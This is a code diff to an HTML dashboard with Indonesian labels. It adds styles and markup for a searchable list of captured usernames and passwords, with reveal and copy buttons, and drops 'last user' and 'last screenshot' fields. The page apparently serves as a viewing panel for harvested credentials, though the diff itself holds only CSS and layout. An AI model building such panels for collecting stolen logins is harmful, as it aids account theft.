@@ -73,6 +73,83 @@
       padding: 10px;
       margin-bottom: 10px;
     }
+    .search-box {
+      width: 100%;
+      padding: 6px 10px;
+      border: 1px solid #31344f;
+      border-radius: 6px;
+      background: #181b2b;
+      color: #e0e0e0;
+      font-size: 12px;
+      margin-bottom: 8px;
+      outline: none;
+    }
+    .search-box:focus { border-color: #4a6fa5; }
+    .search-box::placeholder { color: #555; }
+    .cred-list {
+      max-height: 220px;
+      overflow-y: auto;
+      scrollbar-width: thin;
+      scrollbar-color: #333 #1a1a2e;
+    }
+    .cred-list::-webkit-scrollbar { width: 5px; }
+    .cred-list::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
+    .cred-item {
+      padding: 6px 8px;
+      border-bottom: 1px solid #2a2d45;
+      font-size: 11px;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    .cred-item:hover { background: #2a2d45; }
+    .cred-item:last-child { border-bottom: none; }
+    .cred-user {
+      color: #9fb7ff;
+      font-weight: 600;
+      font-size: 12px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .cred-pass {
+      color: #c0c0c0;
+      font-family: 'Consolas', 'Courier New', monospace;
+      font-size: 12px;
+      margin-top: 2px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .cred-pass .dots { letter-spacing: 2px; }
+    .cred-time {
+      color: #666;
+      font-size: 10px;
+      margin-top: 2px;
+    }
+    .btn-copy {
+      background: none;
+      border: none;
+      color: #666;
+      cursor: pointer;
+      font-size: 11px;
+      padding: 0 2px;
+    }
+    .btn-copy:hover { color: #9fb7ff; }
+    .btn-toggle-eye {
+      background: none;
+      border: none;
+      color: #666;
+      cursor: pointer;
+      font-size: 12px;
+      padding: 0;
+    }
+    .btn-toggle-eye:hover { color: #9fb7ff; }
+    .no-results {
+      color: #555;
+      font-size: 11px;
+      text-align: center;
+      padding: 12px 0;
+    }
     .panel h2 {
       font-size: 12px;
       color: #9fb7ff;
@@ -179,13 +256,9 @@
       <span class="meta-label">Jumlah record</span>
       <span class="meta-value" id="recordCount">0</span>
     </div>
-    <div class="meta-row">
-      <span class="meta-label">User terakhir</span>
-      <span class="meta-value" id="lastUser">-</span>
-    </div>
-    <div class="meta-row">
-      <span class="meta-label">Screenshot terakhir</span>
-      <span class="meta-value" id="lastShot">-</span>
+    <input type="text" class="search-box" id="searchInput" placeholder="🔍 Cari username...">
+    <div class="cred-list" id="credList">
+      <div class="no-results">Belum ada data</div>
     </div>
   </div>
 
